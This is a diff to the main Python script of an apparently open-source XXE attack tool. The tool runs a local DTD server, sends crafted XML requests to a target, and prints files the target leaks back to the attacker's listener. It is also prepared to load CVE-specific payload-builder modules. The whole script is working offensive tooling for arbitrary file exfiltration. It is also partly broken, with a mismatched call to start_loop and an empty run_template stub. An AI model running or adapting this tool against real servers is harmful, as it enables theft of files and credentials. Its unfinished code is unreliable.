@@ -1,64 +1,153 @@
 #!/usr/bin/env python3
-
+import ipaddress
+import logging
 import sys, os
 import signal
 import argparse
 from multiprocessing import Process
-from lib.XXEServer import startServer
+from lib.dtdserver import startServer
 import time
 
-from lib.AttackSession import AttackSession
+from lib.AttackSession import AttackSession, CliBuilder, ModuleBuilder, TemplateBuilder
 
-def start_loop(attackSession, args):
+
+from urllib.parse import urlparse
+
+
+def urltype(arg):
+    """A type parser for an url scheme://host:port """
+    url = urlparse(arg)
+    if all((url.scheme, url.netloc)):
+        return arg
+    raise argparse.ArgumentTypeError('Invalid URL')
+
+
+def host_port_type(arg):
+    """A type parser for an url ip:port """
+    try:
+        host, port = arg.split(':')
+        port = int(port)
+        ip = ipaddress.ip_address(host)
+        return ip, port
+    except Exception as e:
+        logging.exception('because')
+        raise argparse.ArgumentTypeError('Invalid URL')
+
+
+def callabletype(name):
+    import importlib
+    try:
+        obj = importlib.import_module(name)
+    except:
+        raise argparse.ArgumentTypeError('name is not a module')
+    if not hasattr(obj, 'build_payload'):
+        raise argparse.ArgumentTypeError(f'module {name} does not have a build_payload callable')
+    cb = getattr(obj, 'build_payload')
+    if not callable(cb):
+        raise argparse.ArgumentTypeError(f'{name}.build_payload is not callable')
+    return cb
+
+
+def start_loop(attackSession):
+    """CLI loop. input a filename, get it exfiltrated and print on screen """
     try:
         while True:
             print("------")
-            targetFile = eval(input("Target File: "))
+            targetFile = input("Target File: ")
             print("[+] Sending XML request...")
-            response = attackSession.sendPayload(targetFile, args.interface, args.listenPort)
+            response = attackSession.sendPayload(targetFile)
             print(("[+] Server Response: {}".format(response.status_code)))
             
     except KeyboardInterrupt:
         print("\n[!] Exiting...")
         sys.exit(0)
 
-def parseArgs():
+
+def run_cli(args):
+    # DTD server
+    p = start_dtd_server(args)
+
+    # start a CLI and
+    # make a XXE query
+    try:
+        attackSession = AttackSession(args.requestFile)
+        start_loop(attackSession, args)
+        p.kill()
+    except Exception as e:
+        logging.exception("[-] Error running ")
+        p.kill()
+        sys.exit(1)
+
+    return
+
+def run_template(args):
+    return
+
+
+def start_dtd_server(args):
+    # DTD server
+    print("[+] Starting DTD server....")
+    p = Process(target=startServer, kwargs=dict(ip=args.dtdserver[0], port=args.dtdserver[1], isb64=args.isb64))
+    p.start()
+    # TODO / check DTD server online.
+    return p
+
+
+def run_module(args):
+    build_payload = args.modulename
+
+    p = start_dtd_server(args)
+
+    # start a CLI and
+    # make a XXE query
+    try:
+        attackSession = ModuleBuilder(target=args.target, build_payload=args.modulename, dtdserver=args.dtdserver) # , **args.__dict__)
+        start_loop(attackSession)
+        p.kill()
+    except Exception as e:
+        logging.exception("[-] Error running ")
+        p.kill()
+        sys.exit(1)
+    return
+
+
+def main():
+    # use a text file for the body with {} param formating
+    # xxtimes xxe://target:port -f requestFile dtd://host:port
+    # use a module to format the request body
+    # xxtimes xxe://target:port dtd://host:port  -m cve-xxx-xxx
     parser = argparse.ArgumentParser(description="Local File Explorer Using XXE DTD Entity Expansion")
-    parser.add_argument('-f', '--requestFile', dest='requestFile', required=True, help="Vulnerable request file with {targetFilename}, {xxeHelperServerInterface}, and {xxeHelperServerPort} marked")
-    parser.add_argument('-p', '--port', dest='port', default=80, help="Port on target host (eg 80, 443)")       #TODO: implement actually using this
-    parser.add_argument('-t', '--targetHost', dest='targetHost', help="Override host header in request file")   #TODO: implement actually using this
-    parser.add_argument('-l', '--listenPort', dest='listenPort', type=int, default=8000, help="Port for local DTD helper server")
-    parser.add_argument('-i', '--listenIP', dest='interface', required=True, help="Bind IP address for local DTD helper server")
-    parser.add_argument('--b64', dest='isb64', action='store_true', default=False, help="Flag if data will be base64 encoded (e.g. using php's convert.base64 function for files)")
+    base = parser.add_argument_group(title='base', description='base info')
+    base.add_argument('target', type=urltype, help="target scheme://server:port")
+    base.add_argument('--dtdserver', type=host_port_type, default='0.0.0.0:8000', help="local address to listen for dtd HTTP helper server")
+    base.add_argument('--b64', dest='isb64', action='store_true', default=False, help="Flag if data will be base64 encoded (e.g. using php's convert.base64 function for files)")
+    subparsers = parser.add_subparsers()
+
+    # post / get
+    cli = subparsers.add_parser('cli', help='build xxe on cli')
+    cli.add_argument('--method', choices=['GET', 'POST'])
+    cli.add_argument('--header', nargs='*', help="the XML? data to send as data")
+    cli.add_argument('--data', help="the XML? data to send as data - use")
+    cli.set_defaults(func=run_cli)
+
+    # or read from file
+    request_template = subparsers.add_parser('template', help='build xxe from a template with {dtdHost}, and {dtdPort} ')
+    request_template.add_argument('-f', '--requestFile', dest='requestFile', type=argparse.FileType('r'), required=True, help="Vulnerable request file with {targetFilename}, {xxeHelperServerInterface}, and {xxeHelperServerPort} marked")
+    request_template.set_defaults(func=run_template)
+
+    # or use a module to generate
+    module = subparsers.add_parser('module', help='build xxe from a python callable')
+    # module.add_argument('-f', '--requestFile', dest='requestFile', type=argparse.FileType('rb'), help="Vulnerable request file template")
+    module.add_argument('modulename', type=callabletype, help="Build payload using a python callable")
+    module.set_defaults(func=run_module)
+
     args = parser.parse_args()
-    return args
+
+    # call the right function
+    args.func(args)
+    return
+
 
 if __name__ == '__main__':
-    args = parseArgs()
-    print("[+] Starting server....")
-    p = Process(target=startServer, kwargs=dict(ip=args.interface, port=args.listenPort, isb64=args.isb64))
-    p.start()
-    #Hacky way to make sure server is started before jumping in
-    #TODO replace with proper messaging
-    while True:
-        if os.path.isfile('.server_started'):
-            break
-
-    attackSession = AttackSession(args.requestFile)
-    #try:
-    #    attackSession = AttackSession(args.requestFile)
-    #except:
-    #    print "[-] Could not open/read request file!"
-    #    sys.exit(1)
-            
-    start_loop(attackSession, args)
-
-    
-    
-
-
-
-
-
-
-    
+    logging.basicConfig(level=logging.DEBUG)
+    main()
